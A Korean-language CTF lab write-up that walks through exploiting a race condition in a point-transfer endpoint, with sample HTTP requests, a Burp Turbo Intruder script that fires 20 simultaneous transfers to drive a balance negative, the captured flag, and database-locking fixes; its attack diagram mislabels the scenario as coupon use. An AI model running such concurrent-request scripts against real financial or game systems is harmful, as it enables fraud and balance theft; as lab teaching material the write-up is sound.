+++
title = "VulnABLE CTF [LUXORA] Write-up: Race Condition 🥈 Silver"
date = "2026-03-14"
[extra]
categories = "pentesting"
tags = ["CTF", "LUXORA", "Race Condition", "Silver", "Limit Bypass", "Write-up"]
+++

# VulnABLE CTF [LUXORA] Write-up: Race Condition 🥈 Silver

## 🎯 챌린지 개요
- **카테고리**: Server-Side Layer (Race Condition)
- **난이도**: 🥈 Silver
- **타겟 경로**: `/race/silver`
- **목표**: 사용자 간의 포인트(Point) 이체 기능에서, 내 잔액 한도보다 더 많은 금액을 송금할 수 없도록 막아둔 검증 로직을 동시성 공격(Race Condition)으로 뚫어내고, 무한정으로 포인트를 증식시켜라.

---

## 🕵️‍♂️ 1. 정보 수집 및 시스템 동작 분석 (Reconnaissance)

`/race/silver` 에는 다른 사용자에게 포인트를 보내는 송금(Transfer) 기능이 있습니다.
현재 내 계정(`userA`)의 잔액은 **100 포인트** 입니다.

**[정상 송금 요청 테스트]**
```http
POST /race/silver/transfer HTTP/1.1
Content-Type: application/x-www-form-urlencoded
Cookie: session=userA_session

target_user=userB&amount=50
```
➔ 서버 응답: `Success. Current balance: 50`

**[한도 초과 송금 테스트]**
```http
POST /race/silver/transfer HTTP/1.1
...
target_user=userB&amount=200
```
➔ 서버 응답: `Error: Insufficient balance.`

**[해커의 사고 과정]**
1. 이 시스템은 내가 보낼 금액(`amount`)이 현재 내 잔액(`balance`)보다 작은지 먼저 확인(Check)한다.
2. 작으면, 내 잔액에서 `amount`를 빼고(Subtract), 상대방 잔액에 `amount`를 더한다(Add).
3. 만약 내가 100 포인트를 보내는 요청 10개를 1밀리초 안에 동시에 서버에 때려 넣는다면?
4. 서버의 10개 스레드는 모두 내 잔액을 100으로 읽고 "통과!"를 외친 다음, 마이너스 계산을 10번이나 해버릴 것이다! (잔액은 -900이 되고, 상대방은 1000을 받게 됨)

---

## 💥 2. 취약점 식별 및 공격 설계 (Exploitation)

### 📊 공격 흐름도 (Attack Flow)

```text
[ Attacker ] --(Thread 1: Use Coupon)--> [ Web Server ] --(Check DB)--> Valid
[ Attacker ] --(Thread 2: Use Coupon)--> [ Web Server ] --(Check DB)--> Valid
                                         |-- Both Apply Discount!
```


이른바 **Limit Exceeding / Balance Manipulation** 기법입니다.

### 💡 터보 인트루더 (Burp Suite Turbo Intruder) 스크립트 작성
Race Condition은 완전히 동일한 타이밍에 패킷이 도착해야 성공 확률이 높습니다. 파이썬 스크립트도 좋지만, Burp Suite의 Turbo Intruder 확장 기능을 사용하면 HTTP/1.1 Pipelining을 이용해 단일 TCP 연결에서 수십 개의 요청을 문자 그대로 "동시에" 밀어 넣을 수 있습니다.

**[Turbo Intruder 스크립트 예시]**
```python
def queueRequests(target, wordlists):
    engine = RequestEngine(endpoint=target.endpoint,
                           concurrentConnections=1, # 단일 커넥션에 몰아넣기
                           requestsPerConnection=100,
                           pipeline=True)

    request = '''POST /race/silver/transfer HTTP/1.1
Host: localhost:3000
Content-Type: application/x-www-form-urlencoded
Cookie: session=userA_session

target_user=userB&amount=100'''

    # 똑같은 요청을 20번 큐에 쌓음
    for i in range(20):
        engine.queue(request)

def handleResponse(req, interesting):
    table.add(req)
```

---

## 🚀 3. 공격 수행 및 계좌 잔고 확인

Turbo Intruder의 [Attack] 버튼을 눌러 20개의 요청을 동시에 발사합니다.

### 🔍 서버 내부의 동작 (Race Window)
- 스레드 1: 잔액 확인 (100 >= 100) -> 통과
- 스레드 2: 잔액 확인 (100 >= 100) -> 통과
...
- 스레드 15: 잔액 확인 (100 >= 100) -> 통과

(이후 순차적으로 혹은 비동기적으로 업데이트 연산이 일어남)
- 스레드 1 업데이트: userA = 0, userB = +100
- 스레드 2 업데이트: userA = -100, userB = +200
- 스레드 15 업데이트: userA = -1400, userB = +1500

### 🔍 공격 결과
상대방 계정(`userB`)으로 로그인해보면 잔액이 비정상적으로 1500포인트로 뻥튀기된 것을 볼 수 있습니다. 이 비정상적인 잔고를 이용해 1000포인트짜리 플래그를 구매합니다.

```text
[!] System: Balance manipulation detected.
FLAG: FLAG{RACE_🥈_BALANCE_BYPASS_D4E5F6}
```

---

## 🚩 4. 롸잇업 결론 및 플래그

금융이나 게임 시스템에서 동시성 제어에 실패할 경우, 사용자가 무에서 유를 창조(돈 복사)하는 치명적인 비즈니스 로직 결함이 발생함을 실증했습니다.

**🔥 획득한 플래그:**
`FLAG{RACE_🥈_BALANCE_BYPASS_D4E5F6}`

### 🛡️ 취약점 원인 및 패치 방안 (Remediation)
Bronze 단계와 마찬가지로 데이터베이스 레벨에서의 **트랜잭션(Transaction)과 락(Lock)**의 부재가 원인입니다.

* **안전한 패치 가이드 (원자적 연산 및 체크 제약조건)**
1. **Pessimistic Lock (SELECT ... FOR UPDATE)**
   송금 전 내 계좌를 먼저 Lock으로 묶어버리면, 다른 스레드는 첫 번째 스레드의 트랜잭션이 완전히 끝날 때까지 조회를 대기(Wait)하게 되므로 마이너스 연산이 불가능해집니다.
2. **DB 제약 조건(Constraint) 추가 (최고의 방어)**
   애플리케이션 코드를 믿지 말고, 데이터베이스 테이블 자체에 **"잔액은 0보다 작아질 수 없다"**는 제약 조건을 걸어버립니다.
   ```sql
   ALTER TABLE accounts ADD CONSTRAINT check_positive_balance CHECK (balance >= 0);
   ```
   이렇게 설정하면, 아무리 Race Condition이 발생해서 두 번째 스레드가 마이너스로 UPDATE 하려고 시도해도 DB가 에러(Constraint Violation)를 뱉으며 쿼리를 거부하게 됩니다.